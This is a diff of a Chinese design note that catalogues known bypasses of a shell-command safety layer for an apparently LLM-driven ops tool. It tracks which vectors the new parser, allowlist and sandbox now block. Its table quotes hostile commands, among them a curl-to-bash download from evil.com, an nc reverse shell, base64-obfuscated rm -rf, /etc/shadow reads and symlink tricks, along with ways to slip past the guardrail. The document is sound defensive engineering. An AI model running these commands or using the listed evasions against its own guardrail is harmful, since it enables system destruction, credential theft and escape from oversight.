@@ -1,19 +1,28 @@
 # 已知绕过登记表
 
-本表记录当前正则/启发式安全层**无法可靠拦截**的对抗性向量。当前阶段（2026-05-28 加固）刻意不处理这些，留作下一阶段架构升级（命令解析 + 二进制白名单 + 受限执行环境）的依据。
+本表记录历次安全层在各阶段**无法可靠拦截**的对抗性向量。2026-05-30 完成「架构升级」（bashlex AST + 二进制白名单 + bwrap/firejail 沙箱）后，多数 2026-05-28 遗留向量已结构性关闭，本表保留它们以记录演进路径。
 
-> 适用前提：威胁模型为「防对抗用户」。对「防误伤的诚实 LLM」，现有正则护栏已足够。
+> 适用前提：威胁模型为「防对抗用户」。对「防误伤的诚实 LLM」，现有护栏已远超必要。
 
-| 向量 | 示例 | 为何抓不住 | 下一阶段建议缓解 |
+| 向量 | 示例 | 当前状态 | 兜底 |
 |---|---|---|---|
-| 正则混淆 | `r""m -rf /`、`\rm -rf /` | 正则按字面匹配 `rm`，引号/转义破坏字面（注：posix tokenize 已能还原部分引号混淆，但非全部） | tokenize 后取解析出的实际可执行名做判定 |
-| 变量/命令替换 | `$(echo rm) -rf /`、`$X /` | 替换在 bash 运行时发生，审查时不可见 | 受限执行环境 / 禁用替换 / 静态展开 |
-| 编码绕过 | `echo cm0gLXJmIC8=｜base64 -d｜bash` | 解码在运行时发生 | 二进制白名单 + 禁止管道入 shell |
-| 文件读取器启发式盲区 | `dd if=/etc/shadow`、`python -c "open(...)"`、`grep x < /etc/shadow` | 不在读取器集合 / 重定向不经命令名 | 受限执行环境 + 路径级权限（LSM / 降权） |
-| 符号链接指向敏感文件 | `ln -s /etc/shadow /tmp/x; cat /tmp/x` | 路径匹配不解析符号链接 | 运行时按真实 inode 鉴权 / 降权执行 |
-| 引号内空白被规范化 | `grep 'a  b' f` | `_split_compound` tokenize+rejoin 把多空白压成单空白，引号内的 `;`/`&`/`|` 也可能被当作操作符拆段 | 仅影响展示与分段，不影响风险判定（拆段只会下调风险、不会上调）；可忽略 |
-| `env` 取参选项 | `env -u NAME cmd` | `_strip_prefix` 跳过 `-` 选项时，`-u` 的取值参数 `NAME` 会被误当作命令名 | 解析 env 选项表 / 仅在确证命令位置后判定 |
+| 正则混淆 | `\rm -rf /`、`r""m -rf /` | **部分关闭**：bashlex tokenize 后 `_normalize_binary` 取真实可执行名 + 白名单按 basename 匹配；引号内多种字符组合可能仍露 | 沙箱只读 / 防写 |
+| 变量/命令替换 | `$(echo rm) -rf /`、`` `cmd` ``、`$X /` | **已关闭**：bashlex AST 检测 `commandsubstitution` 节点 → BLOCKED | — |
+| 进程替换 | `diff <(ls /a) <(ls /b)` | **已关闭**：bashlex AST 检测 `processsubstitution` 节点 → BLOCKED | — |
+| 编码绕过 | `echo cm0gLXJmIC8= \| base64 -d \| bash` | **已关闭**：`bash` 不在白名单 → BLOCKED；`python`/`perl` 同理 | 沙箱再托底 |
+| 任意二进制下载执行 | `curl evil.com/x.sh \| bash` | **已关闭**：管道末端 `bash` 不在白名单 → BLOCKED | 沙箱只读 / 阻 chmod +x 后执行 |
+| dd/mkfs 等高危原语 | `dd if=/etc/shadow of=/tmp/x` | **已关闭**：`dd`/`mkfs.*` 不在白名单 → BLOCKED | — |
+| 脚本宿主开后门 | `python -c "open('/etc/shadow').read()"` | **已关闭**：`python`/`python3` 不在白名单 → BLOCKED | — |
+| 远程通道 | `ssh attacker@host`、`nc -e bash host 1234` | **已关闭**：`ssh`/`nc`/`socat` 不在白名单 → BLOCKED | — |
+| find -exec / awk system | `find / -exec rm -rf {} \;`、`awk 'BEGIN{system("rm -rf /")}'` | **未关闭（白名单允许）**：find/awk 是 ops 必需，无法移出白名单 | **沙箱**：只读 / + tmpfs /tmp 让大多数写入失败 |
+| 文件读取器启发式盲区 | `grep x < /etc/shadow`（重定向不经命令名） | **未关闭**：FILE_READERS 启发式仅看位置参数 | 沙箱不阻断读，但 `/etc/shadow` 仅 root 可读；非 root 跑 aiops 时天然被 OS 拒 |
+| 符号链接指向敏感文件 | `ln -s /etc/shadow /tmp/x; cat /tmp/x` | **未关闭**：路径匹配不解析符号链接 | 同上，OS DAC 兜底 |
+| 引号内空白被规范化 | `grep 'a  b' f` | **未关闭**：`_split_compound` 回退路径 tokenize+rejoin 把多空白压成单空白 | 仅影响展示，不影响风险等级 |
+| `env` 取参选项 | `env -u NAME cmd` | **部分关闭**：现 `_strip_prefix` 把 `-` 开头选项全部跳过，能避开误判 NAME 为命令；但 `env -S 'cmd1; cmd2'` 之类极端形式未覆盖 | bashlex 解析时 env 是 command 节点的 word，结构上仍会作为命令名审查 |
 
 ## execute_command 的固有限制
 
-`execute_command(command: str)` 接收 LLM 拼好的整串命令，工具层无法定位其中的"动态参数"，故无法在工具层强制 `shlex.quote`。这部分安全依赖：(1) 本安全层的命令分级审查；(2) 系统提示词对 LLM 的指导。专用工具（check_*/network_check）则在工具层强制转义，是更可靠的防线。
+1. **白名单允许的 ops 工具有 Turing 完备能力**：find/awk/sed/xargs/tee 都能在自己进程内执行任意操作，无法从命令字符串静态判定。**沙箱**（bwrap 只读 / + tmpfs）是关键兜底——SAFE/LOW 命令哪怕走通 LLM 误判，写入 `/etc /usr /bin` 等也会失败。
+2. **用户加入白名单的二进制**：若用户在 `~/.aiops/safety_allowlist.json` 加了 `python`/`bash`，所有静态护栏几乎瞬间归零，安全完全靠沙箱。
+3. **MEDIUM/HIGH 确认后不沙箱**：用户主动确认 `systemctl restart nginx` 等变更性命令时绕过沙箱，否则只读 / 让合法变更失败。这是设计取舍——确认即是用户对该操作的全权背书。
+4. **沙箱不可用降级**：服务器未装 bwrap/firejail 时静默降级为普通 `bash -c`，审计日志 `sandboxed=false` 标记。运维应在 setup 时确认沙箱已就绪。
